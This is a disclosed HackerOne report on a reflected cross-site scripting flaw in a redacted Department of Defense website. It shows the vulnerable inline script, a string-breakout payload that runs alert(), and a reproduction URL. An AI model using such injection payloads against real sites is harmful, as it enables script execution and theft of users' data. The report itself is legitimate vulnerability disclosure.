---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1059395'
original_report_id: '1059395'
title: Reflected XSS on █████████
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2020-12-15T12:48:35.701Z'
disclosed_at: '2021-04-02T18:50:29.579Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on █████████

## Metadata

- HackerOne Report ID: 1059395
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2021-04-02T18:50:29.579Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary 
Reflected XSS on `█████`.

## Description
The page `█████` has a reflected parameter `██████████`. The parameter is used in a javascript function. For example for requesting `http://█████████/?█████████=chron0x` the javascript is as follows:
```javascript
[...]
<script>
	//alert('boo');
    function clickit(){
        var █████████ = 'chron0x';
        if (██████████!==''){
            //alert(████████);
            $('#'+████████).click();
            //alert(████);
	    }
    }
</script>
[...]
```
Due to improper input sanitization, this is vulnerable to XSS. The payload `?█████=';}alert("chron0x"); function clickit(){//`


```javascript
[...]
<script>
	//alert('boo');
    function clickit(){
        var ████ = '';
    }
    alert("chron0x"); 
    function clickit(){//';
        if (██████████!==''){
            //alert(██████████);
            $('#'+██████████).click();
            //alert(████████);
	    }
    }
</script>
[...]
```

pops an alert box, demonstrating XSS.

Note: I am reporting this here, since the footer of `████` states `Official United States ███████ Website. The ████████ █████.`, and the United States ██████████ underlies the DoD. If this should not belong to the DoD scope I would kindly ask to self close this issue.

## Step-by-step Reproduction Instructions

1. Visit `http://█████/?██████=%27;}alert(%22chron0x%22);%20function%20clickit(){//`

An alert box with `chron0x` pops.

## Mitigation/Remediation Actions
Sanitize the input for the ███████ parameter, such that certain characters are encoded or not allowed.

## Impact

Data can be stolen, or Javascript can be executed.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
